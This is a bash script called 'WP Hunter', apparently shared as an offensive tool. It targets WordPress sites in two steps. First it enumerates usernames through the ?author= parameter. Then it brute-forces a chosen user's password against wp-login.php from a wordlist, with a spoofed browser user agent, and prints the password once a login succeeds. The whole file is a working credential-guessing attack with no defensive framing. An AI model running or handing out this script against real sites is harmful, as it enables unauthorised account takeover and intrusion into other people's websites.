#!/bin/bash
# thenurhabib

USERAGENT="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:21.0) Gecko/20130331 Firefox/21.0"
TIMEOUT=1
COOKIE=cookie-`date +%s`
COOKIEPATH="/tmp/$COOKIE"


# Print Banner.
echo -e "\e[1;31m
 __          _______    _    _             _            
 \ \        / /  __ \  | |  | |           | |           
  \ \  /\  / /| |__) | | |__| |_   _ _ __ | |_ ___ _ __ 
   \ \/  \/ / |  ___/  |  __  | | | | '_ \| __/ _ \ '__|
    \  /\  /  | |      | |  | | |_| | | | | ||  __/ |   
     \/  \/   |_|      |_|  |_|\__,_|_| |_|\__\___|_|   
                                                        
                            \e[1;34m  @thenurhabib 
"

# Help
helpMenu(){
    echo -e "\e[1;33mArguments:\n\t--url\t\twordpress url\n\t--user\t\twordpress username\n\t--wordlist\tpath to password wordlist\n"
    echo -e "User Enumeration:\n./attack.sh --url=www.example.com\n\nPassword Bruteforce:\n./attack.sh --url=www.example.com --user=admin --wordlist=wordlist.txt\e[1;32m"
}


# Test wordpress url
testUrl(){
    CHECK_URL=`curl -o /dev/null --silent --head --write-out '%{http_code}\n' $WP_URL/wp-login.php`
    if [ "$CHECK_URL" -ne 200 ]; then echo -e "Url error: $WP_URL\nHTTP CODE: $CHECK_URL"; exit; fi
}

# User Enumeration
userEnum(){
    echo "[+] Username or nickname enumeration"
    for i in {1..10}
    do
        users=($(curl -s -A "$USERAGENT" -L -i $WP_URL/?author=$i | grep "\/author\/.*\/?mode" | cut -d\/ -f3))
        if [[ $users ]]; then
            echo $users
            echo $WP_URL/?author=$i
        fi
    done
    exit
}

# Get arguments
agrumentArry=( $@ )
argumentLenth=${#agrumentArry[@]}

# Check arguments
if [ "$argumentLenth" -eq 1 ]; then
    WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
    testUrl
    userEnum
fi

if [ "$argumentLenth" -ne 3 ]; then
    helpMenu
    exit

else
    # Get value
    WP_ADMIN=`echo $@ | grep -o "\-\-user=.*" | cut -d\= -f2 | cut -d" " -f1`
    WP_PASSWORD=`echo $@ | grep -o "\-\-wordlist=.*" | cut -d\= -f2 | cut -d" " -f1`
    if [ ! -f "$WP_PASSWORD" ]; then echo "Wordlist not found: $WP_PASSWORD"; exit; fi
    WP_URL=`echo $@ | grep -o "\-\-url=.*" | cut -d\= -f2 | cut -d" " -f1`
    testUrl
fi

# Get cookie
curl -s -A "$USERAGENT" -c "$COOKIEPATH" $WP_URL/wp-login.php > /dev/null

# Bruteforce
echo "[+] Bruteforcing user [$WP_ADMIN]"
cat "$WP_PASSWORD" | while read line;
do {
        echo $line
        REQ=`curl -s -b "$COOKIEPATH" -A "$USERAGENT" --connect-timeout $TIMEOUT -d log="$WP_ADMIN" -d pwd="$line" -d wp-submit="Log In" -d redirect_to="$WP_URL/wp-admin" -d testcookie=1 $WP_URL/wp-login.php`
        
        if [ "$REQ" == "" ]; then echo "The password is: $line"; rm "$COOKIEPATH"; exit; fi
    }
done


rm "$COOKIEPATH" 2> /dev/null
